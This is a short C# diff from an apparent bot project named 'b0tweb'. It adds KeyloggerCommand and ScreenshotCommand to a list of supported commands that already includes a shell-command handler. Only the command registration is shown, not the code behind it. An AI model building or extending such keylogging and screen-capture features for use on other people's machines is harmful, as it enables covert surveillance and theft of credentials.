@@ -1,8 +1,5 @@
 ﻿using System;
 using System.Threading;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
 
 namespace b0tweb.Commands
 {
@@ -11,6 +8,8 @@ namespace b0tweb.Commands
         private static AbstractCommand[] _supportedCommands = { 
             new CMDCommand(), 
             new StallmanCommand(),
+	    new KeyloggerCommand(),
+            new ScreenshotCommand(),
         };
 
         /// <summary>
